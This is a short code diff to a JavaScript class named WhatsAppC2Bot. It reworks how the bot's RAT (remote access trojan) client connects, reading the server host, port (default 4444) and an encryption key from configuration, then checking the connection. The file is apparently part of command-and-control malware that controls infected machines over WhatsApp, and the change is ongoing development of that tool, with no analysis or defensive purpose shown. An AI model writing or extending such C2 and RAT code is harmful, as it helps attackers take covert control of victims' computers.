@@ -54,7 +54,11 @@ class WhatsAppC2Bot {
    */
   async initRATClient() {
     try {
-      this.ratClient = new RATClient('http://localhost:5000');
+      const host = this.config.ratServer.host || '127.0.0.1';
+      const port = this.config.ratServer.port || 4444;
+      const key = this.config.ratServer.encryptionKey || 'YOUR_ENCRYPTION_KEY_HERE';
+      
+      this.ratClient = new RATClient(host, port, key);
       
       // Test connection
       const status = await this.ratClient.checkStatus();
